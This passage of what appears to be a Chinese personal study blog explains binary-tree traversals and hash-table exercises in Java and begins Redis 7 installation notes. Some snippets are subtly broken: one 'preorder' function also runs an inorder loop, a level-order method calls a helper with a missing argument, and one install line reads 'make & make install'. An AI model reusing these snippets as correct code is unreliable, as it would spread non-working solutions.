result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    inorder(root.left, result);</span><br><span class="line">    result.add(root.val); <span class="comment">// 当前结点中间输出</span></span><br><span class="line">    inorder(root.right, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="迭代法"><a href="#迭代法" class="headerlink" title="(迭代法)"></a>(迭代法)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 前序</span></span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        result.add(node.val);<span class="comment">// 后进先出，因此先压右子节点</span></span><br><span class="line">        <span class="keyword">if</span> (node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 中序</span></span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            result.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 前序遍历顺序：中-左-右，入栈顺序：中-右-左 出栈顺序：中-左-右</span></span><br><span class="line"><span class="comment">// 中序遍历顺序: 左-中-右 入栈顺序：左-右    出栈顺序：左-中-右，实际上先压完所有左节点，然后弹出最左叶子结点，再弹出最左叶子结点父节点，然后压入父节点的右结点</span></span><br><span class="line"><span class="comment">// 后序遍历顺序 左-右-中 入栈顺序：中-左-右 出栈顺序：中-右-左， 最后翻转结果</span></span><br></pre></td></tr></table></figure>

<h4 id="统一迭代法-中序遍历的迭代"><a href="#统一迭代法-中序遍历的迭代" class="headerlink" title="(统一迭代法) 中序遍历的迭代"></a>(统一迭代法) 中序遍历的迭代</h4><p>上文中序遍历迭代过程中，使用栈无法同时解决访问节点（遍历节点）和处理节点（将元素放进结果集）不一致的情况。可以将访问的节点放入栈中，把要处理的节点也放入栈中但是紧接着放入一个空指针作为标记。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序遍历</span></span><br><span class="line"><span class="comment">// 前序后序只需要修改ABCD的顺序即可</span></span><br><span class="line"><span class="comment">// 前序右左node null ADBC 后序 node null右左 BCAD</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line"><span class="comment">/*A*/</span>       <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line"><span class="comment">/*B*/</span>       st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line"><span class="comment">/*C*/</span>       st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line"><span class="comment">/*D*/</span>       <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">            st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">            node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">            st.pop();</span><br><span class="line">            result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240913235137.png" alt="示意图"></p>
<h3 id="层次广度遍历-102-层次遍历"><a href="#层次广度遍历-102-层次遍历" class="headerlink" title="(层次广度遍历) 102 层次遍历"></a>(层次广度遍历) 102 层次遍历</h3><p>给你二叉树的根节点 root ，返回其节点值的 层序遍历 。 （即逐层地，从左到右访问所有节点）</p>
<p>输入：root &#x3D; [3,9,20,1,null,15,7]<br>输出：[[3],[9,20],[1,15,7]]</p>
<p>思路：层次遍历以采用迭代法为主，通过队列实现，具体如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    iterative(root);</span><br><span class="line">    recursion(root);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">recursion</span><span class="params">(TreeNode node, Integer deep)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    deep++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.size() &lt; deep) &#123;</span><br><span class="line">        <span class="comment">//当层级增加时，list的Item也增加，利用list的索引值进行层级界定</span></span><br><span class="line">        List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        result.add(item);</span><br><span class="line">    &#125;</span><br><span class="line">    result.get(deep - <span class="number">1</span>).add(node.val);</span><br><span class="line"></span><br><span class="line">    recursion(node.left, deep);</span><br><span class="line">    recursion(node.right, deep);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">iterative</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">    queue.offer(node);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty())&#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> queue.size();<span class="comment">// 记录每层节点数</span></span><br><span class="line">        <span class="keyword">while</span> ((len&gt;<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            list.add(cur.val);</span><br><span class="line">            <span class="keyword">if</span>(cur.left!= <span class="literal">null</span>)&#123;</span><br><span class="line">                queue.offer(cur.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cur.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                queue.offer(cur.right);</span><br><span class="line">            &#125;</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">106. 从中序与后序遍历序列构造二叉树</a></p>
<h2 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h2><h3 id="较为典型"><a href="#较为典型" class="headerlink" title="较为典型"></a>较为典型</h3><p><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></p>
<h3 id="其他练习"><a href="#其他练习" class="headerlink" title="其他练习"></a>其他练习</h3><p><a href="https://leetcode.cn/problems/sum-of-left-leaves/">404. 左叶子之和</a></p>
<p><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值</a></p>
<p><a href="https://leetcode.cn/problems/path-sum/">112. 路径总和</a></p>
<p><a href="https://leetcode.cn/problems/maximum-binary-tree/">654. 最大二叉树</a></p>
<p><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></p>
<p><a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/">700. 二叉搜索树中的搜索</a></p>
<p><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></p>
<p><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></p>
<p><a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/">111. 二叉树的最小深度</a></p>
<p><a href="https://leetcode.cn/problems/count-complete-tree-nodes/">222. 完全二叉树的节点个数</a></p>
<p><a href="https://leetcode.cn/problems/balanced-binary-tree/">110. 平衡二叉树</a></p>
<p><a href="https://leetcode.cn/problems/binary-tree-paths/">257. 二叉树的所有路径</a></p>
]]></content>
      <categories>
        <category>设计模式与算法</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>二叉树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-哈希表</title>
    <url>/2024/08/30/%E7%AE%97%E6%B3%95-%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<p><strong>当我们需要查询一个元素是否出现过，或者一个元素是否在集合里的时候，就要第一时间想到哈希法。</strong></p>
<h2 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h2><p>哈希表（Hash Table），也称为散列表，是一种根据关键码值（Key value）而直接进行访问的数据结构。它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数称为哈希函数，存放记录的数组称为哈希表。</p>
<p><strong>一般哈希表用于快速判断一个元素是否出现中集合中</strong><br><strong>牺牲空间换时间</strong></p>
<p><strong>哈希表的主要特点：</strong></p>
<ul>
<li>快速查找：哈希表最大的优点就是提供了快速的查找功能。理论上，通过哈希函数**定位数据的复杂度为O(1)**，即常数时间复杂度。但实际上，由于<code>哈希冲突(哈希碰撞)</code>（不同的关键字通过哈希函数计算得到相同的哈希值）的存在，查找效率可能会<code>退化到O(n)</code>。</li>
<li>高效插入和删除：与查找类似，哈希表也支持高效的插入和删除操作。</li>
<li>无序性：哈希表中的元素是无序的，即它们不是按照某种可预测的顺序存储的。</li>
</ul>
<p><strong>哈希冲突(碰撞)的解决方法</strong></p>
<ol>
<li>拉链法：将冲突元素存储在链表中，原索引存储指向链表的指针</li>
<li>线性探测法：要求<code>tableSize&gt;dataSize</code>;将冲突的元素存储到下一个空闲空间</li>
</ol>
<p><strong>常见的三种哈希结构</strong></p>
<p>数组、集合(set)、映射(map)<br>具体特点参照:<a href="https://fushiye.github.io/2024/06/24/Java-note-3/">Java-note-3</a>集合框架</p>
<h2 id="重要例题"><a href="#重要例题" class="headerlink" title="重要例题"></a>重要例题</h2><h3 id="基本示例-242-有效的字母异位词"><a href="#基本示例-242-有效的字母异位词" class="headerlink" title="(基本示例) 242 有效的字母异位词"></a>(基本示例) 242 有效的字母异位词</h3><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。<br>说明: 你可以假设字符串只包含小写字母。</p>
<p>示例:<br>输入: s &#x3D; “anagram”, t &#x3D; “nagaram”<br>输出: true</p>
<p>思路：使用数组记录26个字母出现的次数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] num = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">    num[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; t.length(); j++)&#123;</span><br><span class="line">    num[t.charAt(j) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; <span class="number">26</span>; k++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(num[k] != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>


<h3 id="Java-HashSet-349-两个数组的交集"><a href="#Java-HashSet-349-两个数组的交集" class="headerlink" title="(Java-HashSet) 349 两个数组的交集"></a>(Java-HashSet) 349 两个数组的交集</h3><p>HashSet是Set的一种，可以存储无序的不可重复的数据，用于过滤重复数据<br>具体特点参照:<a href="https://fushiye.github.io/2024/06/24/Java-note-3/">Java-note-3</a>集合框架<br>此问题主要是为了熟悉HashSet的特性和常用方法</p>
<p>给定两个数组 nums1 和 nums2 ，返回 它们的 交集 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序 。</p>
<p>示例：<br>输入：nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]<br>输出：[2]</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;Integer&gt; numsHash = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    Set&lt;Integer&gt; sameNums = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums1.length; i++) &#123;</span><br><span class="line">        numsHash.add(nums1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums2.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (numsHash.contains(nums2[i])) &#123;</span><br><span class="line">            sameNums.add(nums2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[sameNums.size()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t : sameNums) &#123;</span><br><span class="line">        arr[i++] = t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202 快乐数"></a>202 快乐数</h3><p>编写一个算法来判断一个数n是不是快乐数。<br>「快乐数」定义为：<br>对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。<br>然后重复这个过程直到这个数变为1，<code>也可能是无限循环</code>但始终变不到1。<br>如果这个过程结果为1，那么这个数就是快乐数。<br>如果n是快乐数就返回true；不是，则返回false。</p>
<p>示例：<br>输入：n &#x3D; 19<br>输出：true</p>
<p>思路：使用哈希表记录每次的平方和，一旦出现重复，说明已经陷入死循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    Set&lt;Integer&gt; sumTable = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">1</span> &amp;&amp; !sumTable.contains(n)) &#123;</span><br><span class="line">        sumTable.add(n);</span><br><span class="line">        n = getSum(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">        sum += (n % <span class="number">10</span>) * (n % <span class="number">10</span>);</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1 两数之和"></a>1 两数之和</h3><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target 的那 两个 整数，并返回它们的数组下标。你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。你可以按任意顺序返回答案。</p>
<p>示例：<br>输入：nums &#x3D; [2,7,11,15], target &#x3D; 9<br>输出：[0,1]</p>
<p>思路：遍历数组，判断target与当前元素的差值是否在哈希表中，在则返回差值和自己的索引；不在将自己的索引加入表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; indexMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">balance</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">        <span class="keyword">if</span> (indexMap.containsKey(balance)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; i, indexMap.get(balance) &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            indexMap.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h2><h3 id="四数之和"><a href="#四数之和" class="headerlink" title="四数之和"></a>四数之和</h3><p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有多少个元组 (i, j, k, l) 能满足：</p>
<ol>
<li><code>0 &lt;= i, j, k, l &lt; n</code></li>
<li><code>nums1[i] + nums2[j] + nums3[k] + nums4[l] == 0</code></li>
</ol>
<p>示例：<br>输入：nums1 &#x3D; [1,2], nums2 &#x3D; [-2,-1], nums3 &#x3D; [-1,2], nums4 &#x3D; [0,2]<br>输出: 2</p>
<p><strong>思路</strong>：先计算nums1和nums2的和，并将其记录作为key记录在hashMap中，其value为此和出现的次数；然后计算nums3和nums4与0的差，在Map中寻找其寻找差值对应的value，此value即为当前nums3和nums4下可以找到多少满足要求的 nums1和nums2 的元组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Integer, Integer&gt; sumOr12 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i:nums1) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j:nums2) &#123;</span><br><span class="line">        sumOr12.put(i+j, sumOr12.getOrDefault(i+j, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i:nums3) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j:nums4) &#123;</span><br><span class="line">        count += sumOr12.getOrDefault(-i-j, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line"></span><br><span class="line"><span class="comment">//错误写法:</span></span><br><span class="line"></span><br><span class="line">Map&lt;Integer, Integer&gt; sumOr12 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 1. 可以使用增强for循环</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nums1.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; nums2.length; j++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums1[i] + nums2[j];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sumCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 2. 可以使用getOrDefault()</span></span><br><span class="line">        <span class="keyword">if</span> (sumOr12.containsKey(sum)) &#123;</span><br><span class="line">            sumCount = sumOr12.get(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        sumOr12.put(sum, sumCount + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nums3.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; nums4.length; j++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">dif</span> <span class="operator">=</span> -nums3[i] - nums4[j];</span><br><span class="line">        <span class="keyword">if</span> (sumOr12.containsKey(dif)) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sumCount</span> <span class="operator">=</span> sumOr12.get(dif);</span><br><span class="line">            <span class="comment">// 3. 不需要递减，value值本就代表当前nums3,nums4下有多少种nums1和nums2的搭配可以满足条件</span></span><br><span class="line">            <span class="keyword">if</span> (sumCount == <span class="number">1</span>) &#123;</span><br><span class="line">                sumOr12.remove(dif);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sumOr12.put(dif, sumCount - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="简单例题"><a href="#简单例题" class="headerlink" title="简单例题"></a>简单例题</h2><p>仅记录，写法简单，不写</p>
<p><strong>383 赎金信</strong><br>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。如果可以，返回 true ；否则返回 false 。magazine 中的每个字符只能在 ransomNote 中使用一次。</p>
]]></content>
      <categories>
        <category>设计模式与算法</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>哈希表算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-Basic-Note</title>
    <url>/2025/02/07/Redis-Basic-Note/</url>
    <content><![CDATA[<p>这是Redis7入门学习笔记</p>
<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>Redis 是一种<strong>开源的、基于内存的</strong>数据结构存储系统（NOSQL），通常用作数据库、缓存和消息中间件。它通过键值对的方式存储数据，并支持多种数据结构，包括字符串(Strings)、哈希(Hashes)、列表(Lists)、集合(Sets)以及有序集(Sorted Sets)等。<strong>K-V类型的缓存数据库</strong></p>
<p>以下是 Redis 的一些主要特点：</p>
<ul>
<li><strong>高性能</strong>：由于数据存储在内存中，读写速度非常快，适用于需要快速响应的应用场景。</li>
<li><strong>丰富的数据结构</strong>：除了基本的字符串外，还支持列表、集合等多种数据结构，为解决各种问题提供了灵活性。</li>
<li><strong>持久化</strong>：虽然数据默认保存在内存中，但 Redis 提供了两种方式（RDB 和 AOF）来将数据持久化到硬盘上，以防止数据丢失。</li>
<li><strong>发布&#x2F;订阅模式</strong>：支持消息的发布与订阅，使得它可以作为消息队列使用。</li>
<li><strong>事务支持</strong>：提供简单的事务功能，允许一组命令作为一个原子操作执行。</li>
<li><strong>分布式锁</strong>：可以利用 Redis 实现分布式系统中的锁机制，保证数据的一致性和完整性。</li>
<li><strong>主从复制与高可用性</strong>：通过主从复制实现数据冗余，Sentinel 或者集群模式可以提高系统的高可用性和容错能力。</li>
</ul>
<p>Redis 被广泛应用于提升应用性能，特别是在处理高并发请求时表现尤为突出。例如，在社交网络、电子商务、游戏等领域中用来加速数据访问、管理会话信息、实时分析等。此外，它的灵活数据结构也使其成为解决特定问题的理想选择，比如排行榜、计数器、地理空间索引等。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250208215421.png"></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://download.redis.io/releases">安装地址</a></p>
<p>建议在Linux系统安装</p>
<p><a href="https://blog.csdn.net/g310773517/article/details/140321025">yum源无法连接问题解决</a></p>
<h4 id="安装步骤："><a href="#安装步骤：" class="headerlink" title="安装步骤："></a><strong>安装步骤：</strong></h4><ol>
<li><p>确认GCC是否安装</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc --version # 应该有版本号输出</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果没有安装</span></span><br><span class="line">yum install gcc -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装c++库环境</span></span><br><span class="line">yum -y install gcc-c++      </span><br></pre></td></tr></table></figure>
</li>
<li><p>将redis压缩包放到&#x2F;opt&#x2F;目录下，解压并安装</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-7.0.15.tar.gz</span><br><span class="line">cd redis-7.0.15</span><br><span class="line">make &amp; make install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果见 Hint: It<span class="string">&#x27;s a good idea to run &#x27;</span>make <span class="built_in">test</span><span class="string">&#x27; ;) 即安装成功</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">上述为默认安装方法，安装到/usr/local/bin 目录，可前往验证</span></span></span><br><span class="line">cd /usr/local/bin </span><br></pre></td></tr></table></figure></li>
</ol>
<p>安装完成后可见：</p>
<ul>
<li><p><strong>redis-benchmark</strong>：性能测试工具。用于模拟多个客户端同时向 Redis 发送请求，评估 Redis 服务器在高并发情况下的性能表现。</p>
</li>
<li><p><strong>redis-check-rdb</strong>：RDB 文件检查工具。用于检查 RDB（Redis 数据库文件）的有效性和完整性。</p>
</li>
<li><p><strong>redis-sentinel</strong>：监控和故障转移工具。用于监控 Redis 实例的状态，并在主节点发生故障时自动进行故障转移，确保系统的高可用性。</p>
</li>
